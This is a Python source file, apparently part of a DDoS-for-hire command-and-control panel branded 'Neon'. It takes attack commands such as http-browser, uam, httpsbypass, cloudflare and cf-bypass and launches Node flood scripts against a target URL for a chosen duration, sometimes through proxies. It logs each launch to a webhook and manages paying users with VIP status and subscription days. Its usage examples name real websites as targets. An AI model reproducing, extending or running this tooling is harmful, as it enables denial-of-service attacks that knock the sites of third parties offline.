                   VIP      : [\x1b[38;2;0;212;14mTrue\x1b[38;2;255;255;255m]
           \x1b[38;2;243;12;255m╚══════\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m══\x1b[38;2;75;180;255m════╝\x1b[0m
                   
""")
                os.system(f"node ./data/touch.js {url} {time} proxy")
            except IndexError:
                print("Usage : touch-gorilla <url> <port> <time>")
                print("Example : touch-gorilla https://github.com/ 443 60")
        elif "http-browser" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(atk)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(uname, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;51;204;51m                           ╔╗╔╔═╗╔═╗╔╗╔
\033[38;2;51;204;51m                           ║║║║╣ ║ ║║║║
\033[38;2;51;204;51m                           ╝╚╝╚═╝╚═╝╝╚╝
\033[38;2;51;204;51m                \033[33m⚡\033[1;37m 𝒟𝒾𝓈𝒸𝑜 \033[38;2;51;204;51m𝒩𝑒𝑜𝓃\033[1;37m, 𝓟𝓸𝓌𝓮𝓻 𝓪𝓷𝓭 𝓮𝓯𝓯𝓲𝓬𝓲𝓮𝓷𝓬𝔂 \033[33m⚡\033[1;37m
\033[38;2;51;204;51m               ╔═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mMETHOD: \033[90m[\033[37m[http-browser]\033[90m]
\033[38;2;51;204;51m               ╠═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTHREADS: \033[90m[\033[37m50\033[90m]
\033[38;2;51;204;51m               ║   \033[37mVIP: \033[90m[\033[33mtrue\033[90m]
\033[38;2;51;204;51m               ╚═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\n\n\n
""")
                os.system(f"node ./data/browser.js {url} {time}")
            except IndexError:
                print("Usage : http-browser <url> <port> <time>")
                print("Example : http-browser https://github.com/ 443 120")
        elif "http-xv" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(atk)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(uname, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;51;204;51m                           ╔╗╔╔═╗╔═╗╔╗╔
\033[38;2;51;204;51m                           ║║║║╣ ║ ║║║║
\033[38;2;51;204;51m                           ╝╚╝╚═╝╚═╝╝╚╝
\033[38;2;51;204;51m                \033[33m⚡\033[1;37m 𝒟𝒾𝓈𝒸𝑜 \033[38;2;51;204;51m𝒩𝑒𝑜𝓃\033[1;37m, 𝓟𝓸𝓌𝓮𝓻 𝓪𝓷𝓭 𝓮𝓯𝓯𝓲𝓬𝓲𝓮𝓷𝓬𝔂 \033[33m⚡\033[1;37m
\033[38;2;51;204;51m               ╔═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mMETHOD: \033[90m[\033[37m[http-xv]\033[90m]
\033[38;2;51;204;51m               ╠═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTHREADS: \033[90m[\033[37m50\033[90m]
\033[38;2;51;204;51m               ║   \033[37mVIP: \033[90m[\033[33mtrue\033[90m]
\033[38;2;51;204;51m               ╚═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\n\n\n
""")
                os.system(f"node ./data/xv.js {url} {time}")
            except IndexError:
                print("Usage : http-xv <url> <port> <time>")
                print("Example : http-xv https://github.com/ 443 120")
        elif "uam" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                th=cnc.split()[3]
                time=cnc.split()[4]
                Screen.wrapper(atk)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(uname, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;51;204;51m                           ╔╗╔╔═╗╔═╗╔╗╔
\033[38;2;51;204;51m                           ║║║║╣ ║ ║║║║
\033[38;2;51;204;51m                           ╝╚╝╚═╝╚═╝╝╚╝
\033[38;2;51;204;51m                \033[33m⚡\033[1;37m 𝒟𝒾𝓈𝒸𝑜 \033[38;2;51;204;51m𝒩𝑒𝑜𝓃\033[1;37m, 𝓟𝓸𝓌𝓮𝓻 𝓪𝓷𝓭 𝓮𝓯𝓯𝓲𝓬𝓲𝓮𝓷𝓬𝔂 \033[33m⚡\033[1;37m
\033[38;2;51;204;51m               ╔═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mMETHOD: \033[90m[\033[37m[uam]\033[90m]
\033[38;2;51;204;51m               ╠═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTHREADS: \033[90m[\033[37m50\033[90m]
\033[38;2;51;204;51m               ║   \033[37mVIP: \033[90m[\033[33mtrue\033[90m]
\033[38;2;51;204;51m               ╚═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\n\n\n
""")
                os.system(f"node ./data/ll.js {url} {th} {time} proxy.txt")
            except IndexError:
                print("Usage : uam <url> <port> <thread> <time>")
                print("Example : uam https://lequocviet.tk 443 10 1000")
        elif "httpsbypass" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(atk)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(uname, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;51;204;51m                           ╔╗╔╔═╗╔═╗╔╗╔
\033[38;2;51;204;51m                           ║║║║╣ ║ ║║║║
\033[38;2;51;204;51m                           ╝╚╝╚═╝╚═╝╝╚╝
\033[38;2;51;204;51m                \033[33m⚡\033[1;37m 𝒟𝒾𝓈𝒸𝑜 \033[38;2;51;204;51m𝒩𝑒𝑜𝓃\033[1;37m, 𝓟𝓸𝓌𝓮𝓻 𝓪𝓷𝓭 𝓮𝓯𝓯𝓲𝓬𝓲𝓮𝓷𝓬𝔂 \033[33m⚡\033[1;37m
\033[38;2;51;204;51m               ╔═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mMETHOD: \033[90m[\033[37m[httpsbypass]\033[90m]
\033[38;2;51;204;51m               ╠═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTHREADS: \033[90m[\033[37m50\033[90m]
\033[38;2;51;204;51m               ║   \033[37mVIP: \033[90m[\033[33mtrue\033[90m]
\033[38;2;51;204;51m               ╚═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\n\n\n
""")
                os.system(f"node ./data/httpbypassv2.js {url} {time}")
            except IndexError:
                print("Usage : httpsbypass <url> <port> <time>")
                print("Example : httpsbypass https://lequocviet.tk 443 60")
        elif "https-basic" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(atk)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(uname, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;51;204;51m                           ╔╗╔╔═╗╔═╗╔╗╔
\033[38;2;51;204;51m                           ║║║║╣ ║ ║║║║
\033[38;2;51;204;51m                           ╝╚╝╚═╝╚═╝╝╚╝
\033[38;2;51;204;51m                \033[33m⚡\033[1;37m 𝒟𝒾𝓈𝒸𝑜 \033[38;2;51;204;51m𝒩𝑒𝑜𝓃\033[1;37m, 𝓟𝓸𝓌𝓮𝓻 𝓪𝓷𝓭 𝓮𝓯𝓯𝓲𝓬𝓲𝓮𝓷𝓬𝔂 \033[33m⚡\033[1;37m
\033[38;2;51;204;51m               ╔═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mMETHOD: \033[90m[\033[37m[https-basic]\033[90m]
\033[38;2;51;204;51m               ╠═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTHREADS: \033[90m[\033[37m50\033[90m]
\033[38;2;51;204;51m               ║   \033[37mVIP: \033[90m[\033[33mtrue\033[90m]
\033[38;2;51;204;51m               ╚═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\n\n\n
""")
                os.system(f"node ./data/https.js {url} {time} proxy")
            except IndexError:
                print("Usage : https-basic <url> <port> <time>")
                print("Example : https-basic https://panel.aerocloud.tech/ 443 60")
            
        elif "httpsv2" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(atk)
               ## time.sleep(5)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(uname, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;51;204;51m                           ╔╗╔╔═╗╔═╗╔╗╔
\033[38;2;51;204;51m                           ║║║║╣ ║ ║║║║
\033[38;2;51;204;51m                           ╝╚╝╚═╝╚═╝╝╚╝
\033[38;2;51;204;51m                \033[33m⚡\033[1;37m 𝒟𝒾𝓈𝒸𝑜 \033[38;2;51;204;51m𝒩𝑒𝑜𝓃\033[1;37m, 𝓟𝓸𝓌𝓮𝓻 𝓪𝓷𝓭 𝓮𝓯𝓯𝓲𝓬𝓲𝓮𝓷𝓬𝔂 \033[33m⚡\033[1;37m
\033[38;2;51;204;51m               ╔═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mMETHOD: \033[90m[\033[37m[httpsv2]\033[90m]
\033[38;2;51;204;51m               ╠═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTHREADS: \033[90m[\033[37m50\033[90m]
\033[38;2;51;204;51m               ║   \033[37mVIP: \033[90m[\033[33mtrue\033[90m]
\033[38;2;51;204;51m               ╚═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\n\n\n
""")
                os.system(f"node ./data/tls.js {url} {time}")
            except IndexError:
                print("Usage : httpsv2 <url> <port> <time>")
                print("Example : httpsv2 https://www.legoland.com 443 60")
        elif "cloudflare" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                th=cnc.split()[4]
                Screen.wrapper(atk)
                ##time.sleep(5)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(uname, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;51;204;51m                           ╔╗╔╔═╗╔═╗╔╗╔
\033[38;2;51;204;51m                           ║║║║╣ ║ ║║║║
\033[38;2;51;204;51m                           ╝╚╝╚═╝╚═╝╝╚╝
\033[38;2;51;204;51m                \033[33m⚡\033[1;37m 𝒟𝒾𝓈𝒸𝑜 \033[38;2;51;204;51m𝒩𝑒𝑜𝓃\033[1;37m, 𝓟𝓸𝓌𝓮𝓻 𝓪𝓷𝓭 𝓮𝓯𝓯𝓲𝓬𝓲𝓮𝓷𝓬𝔂 \033[33m⚡\033[1;37m
\033[38;2;51;204;51m               ╔═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mMETHOD: \033[90m[\033[37m[cloudflare]\033[90m]
\033[38;2;51;204;51m               ╠═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTHREADS: \033[90m[\033[37m50\033[90m]
\033[38;2;51;204;51m               ║   \033[37mVIP: \033[90m[\033[33mtrue\033[90m]
\033[38;2;51;204;51m               ╚═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\n\n\n
""")
                os.system(f"node ./data/cf.js {url} {time} {th}")
            except IndexError:
                print("Usage : cloudflare <url> <port> <time> <thread>")
                print("Example : cloudflare https://lequocviet.tk 443 1000 10")
        elif "cf-bypass" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                th=cnc.split()[3]
                time=cnc.split()[4]
                Screen.wrapper(atk)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(uname, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;51;204;51m                           ╔╗╔╔═╗╔═╗╔╗╔
\033[38;2;51;204;51m                           ║║║║╣ ║ ║║║║
\033[38;2;51;204;51m                           ╝╚╝╚═╝╚═╝╝╚╝
\033[38;2;51;204;51m                \033[33m⚡\033[1;37m 𝒟𝒾𝓈𝒸𝑜 \033[38;2;51;204;51m𝒩𝑒𝑜𝓃\033[1;37m, 𝓟𝓸𝓌𝓮𝓻 𝓪𝓷𝓭 𝓮𝓯𝓯𝓲𝓬𝓲𝓮𝓷𝓬𝔂 \033[33m⚡\033[1;37m
\033[38;2;51;204;51m               ╔═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;51;204;51m               ║   \033[37mMETHOD: \033[90m[\033[37m[cf-bypass]\033[90m]
\033[38;2;51;204;51m               ╠═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\033[38;2;51;204;51m               ║   \033[37mTHREADS: \033[90m[\033[37m50\033[90m]
\033[38;2;51;204;51m               ║   \033[37mVIP: \033[90m[\033[33mtrue\033[90m]
\033[38;2;51;204;51m               ╚═══\033[38;2;71;209;71m════\033[38;2;92;214;92m════\033[38;2;112;219;112m════\033[38;2;133;224;133m════\033[38;2;153;230;153m════\033[38;2;173;235;173m════\033[38;2;194;240;194m════\033[38;2;214;245;214m════\033[38;2;235;250;235m═
\n\n\n
""")
                os.system(f"node ./data/bypasserr.js {url} {th} {time}")
            except IndexError:
                print("Usage : cf-bypass <url> <port> <thread<10> <time>")
                print("Example : cf-bypass https://github.com/ 443 10 60")
        else:
            try:
                cmd=cnc.split()[0]
                print("Command : [ "+cmd+" ] Not Found on CnC!!")
            except IndexError:
                pass

                
            


def load_users():
    users = {}
    try:
        with open("users.txt", "r") as f:
            for line in f:
                line = line.strip()
                if line:
                    user, passwd = line.split(":")
                    users[user] = passwd
    except FileNotFoundError:
        print("❌ [ERROR] users.txt file not found. Please ensure it’s available.")
        sys.exit(1)
    return users

def show_menu():
    print("┌───────────────────────────────────────────────┐")
    print("│               🔒 Login Menu 🔒               │")
    print("├───────────────────────────────────────────────┤")
    print("│ Please enter your credentials to proceed      │")
    print("└───────────────────────────────────────────────┘")

def login():
    global logged_in_user
    users = load_users()
    logged_in_user = None
    attempts = 0

    while attempts < MAX_ATTEMPTS:
        show_menu()
        print("\n┌───────────────────────────────────────────────┐")
        username = input("│ ⚡ Username: ")
        print("├───────────────────────────────────────────────┤")
        password = getpass.getpass(prompt="│ ⚡ Password: ")
        print("└───────────────────────────────────────────────┘\n")

        # Check if another user is already logged in
        if logged_in_user:
            print(f"⚠️  User '{logged_in_user}' is currently logged in.")
            choice = input("Do you want to disconnect this user? (Y/N): ").strip().upper()
            if choice == "Y":
                print(f"🔌 Disconnecting user '{logged_in_user}'...")
                logged_in_user = username
                print("✅ Login successful! Redirecting...")
                time.sleep(1)
                main()  # Proceed to main function
            elif choice == "N":
                print("⛔ Login attempt cancelled.")
                sys.exit(1)
            else:
                print("❌ Invalid choice. Closing connection.")
                sys.exit(1)
        else:
            # Verify credentials if no user is logged in
            if username in users and password == users[username]:
                logged_in_user = username
                print("✅ Login successful! Redirecting...")
                time.sleep(1)
                main()
            else:
                attempts += 1
                print(f"❌ Incorrect username or password. ({attempts}/{MAX_ATTEMPTS} attempts used)")
                if attempts >= MAX_ATTEMPTS:
                    print("🚫 Maximum attempts reached. Exiting.")
                    sys.exit(1)

# Function to handle main admin actions
def admin():
    if logged_in_user != "root":
        print("⛔ You do not have permission to perform admin actions.")
        sys.exit(1)
    
    print(f"⚡ Welcome, {logged_in_user}! You are logged in as admin.")
    print("Choose an admin command:")
    print("1. adduser <username> <password> <isAdmin>")
    print("2. deluser <username>")
    print("3. addays <username> <days> <true/false>")
    print("4. Exit")
    
    command = input("⚡ Enter command: ").strip()
    
    if command.startswith("adduser"):
        adduser(command)
    elif command.startswith("deluser"):
        deluser(command)
    elif command.startswith("addays"):
        addays(command)
    elif command == "4":
        sys.exit(0)
    else:
        print("❌ Invalid command.")
        main()

# Add user command
def adduser(command):
    parts = command.split()
    if len(parts) != 4:
        print("❌ Invalid command format.")
        return
    
    username = parts[1]
    password = parts[2]
    is_admin = parts[3].lower() == "yes"
    
    # Save user to users.txt
    with open(users_file, "a") as file:
        file.write(f"{username} {password} {'admin' if is_admin else 'user'}\n")
    
    print(f"✅ User '{username}' added successfully.")

    

# Delete user command
def deluser(command):
    parts = command.split()
    if len(parts) != 2:
        print("❌ Invalid command format.")
        return
    
    username = parts[1]
    
    # Read all users
    users = []
    with open(users_file, "r") as file:
        users = file.readlines()
    
    # Filter out the user to be deleted
    users = [user for user in users if not user.startswith(username + " ")]
    
    # Write back the remaining users to the file
    with open(users_file, "w") as file:
        file.writelines(users)
    
    print(f"✅ User '{username}' deleted successfully.")

# Add days to user command
def addays(command):
    parts = command.split()
    if len(parts) != 3:
        print("❌ Invalid command format.")
        return
    
    username = parts[1]
    days = int(parts[2]) if parts[2].isdigit() else 0
    print(f"✅ User '{username}' added {days} days.")

login()
